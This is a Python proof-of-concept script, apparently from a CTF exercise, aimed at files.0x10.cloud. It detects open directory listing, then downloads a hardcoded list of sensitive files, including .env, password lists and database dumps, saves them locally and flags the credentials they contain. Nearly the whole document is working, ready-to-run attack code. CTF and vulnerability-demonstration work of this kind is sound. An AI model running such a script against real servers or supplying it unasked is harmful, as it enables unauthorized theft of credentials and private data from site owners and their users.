# ============================================================
#  Vulnerability: Open Directory Listing + Sensitive File Exposure
#  Target: files.0x10.cloud
#  Author: Luke
# ============================================================
#
#  When directory listing is enabled, anyone can browse the file server
#  and download sensitive files such as .env, database backups, and
#  password lists without any authentication.
#
#  This is a critical security issue because it exposes credentials,
#  secret keys, and potentially the CTF flag.
# ============================================================

import requests
import os
from urllib.parse import urljoin

BASE_URL = "https://files.0x10.cloud/"

# Sensitive files that are commonly exposed when directory listing is enabled
TARGET_FILES = [
    ".env",
    "secret/passwords.txt",
    "backup/db_dump.sql",
    "backup/db_dump_20240301.sql",
    "config.bak",
    "passwords.txt"
]

print("=" * 60)
print("  Open Directory Listing + Sensitive File Exposure")
print("=" * 60)
print(f"  Target: {BASE_URL}\n")

# Check if root directory listing is enabled
try:
    response = requests.get(BASE_URL, timeout=8)
    if response.status_code == 200 and ("Index of" in response.text or "<a href=" in response.text):
        print("[+] Directory listing is ENABLED on the root folder.")
        print("    Anyone can browse and download files without login.\n")
    else:
        print("[-] Root listing not visible, but testing direct file access...\n")
except Exception as e:
    print(f"[!] Error checking root: {e}\n")

# Try to download sensitive files
print("Attempting to access sensitive files...\n")
downloaded = 0

for file_path in TARGET_FILES:
    full_url = urljoin(BASE_URL, file_path)
    save_name = file_path.replace("/", "_")
    save_path = f"exposed_files/{save_name}"

    try:
        response = requests.get(full_url, timeout=10)
        if response.status_code == 200 and len(response.content) > 100:
            os.makedirs("exposed_files", exist_ok=True)
            with open(save_path, "wb") as f:
                f.write(response.content)
            
            print(f"[+] SUCCESS: Downloaded {full_url}")
            print(f"    Saved as: {save_path} ({len(response.content):,} bytes)")
            downloaded += 1

            if ".env" in file_path:
                print("    → .env file contains database credentials and secret keys!")
        else:
            print(f"[-] Not found or empty: {full_url}")
    except Exception as e:
        print(f"[-] Error accessing {full_url}: {e}")

print("\n" + "=" * 60)
print(f"Scan completed! {downloaded} sensitive file(s) were successfully downloaded.")
print("Check the 'exposed_files' folder for credentials and flags.")
print("This demonstrates a critical information disclosure vulnerability.")
